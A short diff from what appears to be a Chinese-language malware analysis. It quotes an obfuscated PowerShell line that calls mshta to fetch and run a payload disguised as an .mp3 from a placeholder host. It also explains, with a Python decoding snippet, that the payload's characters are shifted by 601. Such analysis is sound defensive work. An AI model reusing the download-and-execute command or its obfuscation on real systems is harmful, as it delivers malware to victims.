@@ -956,7 +956,7 @@ powershell . \*i*\\\\\\\\\\\\\\\*2\msh*e http://<HOST>/Coloringoutomic_Host.mp3 
 可通过代码内容猜测出以上字符序列均为原字符的 Char Code 值 +601 得到，可利用以下 Python 脚本得到原始内容:
 
 ```python
-CHARS = []
+CHARS = ...
 print(bytes(c - 601 for c in CHARS))
 ```
 
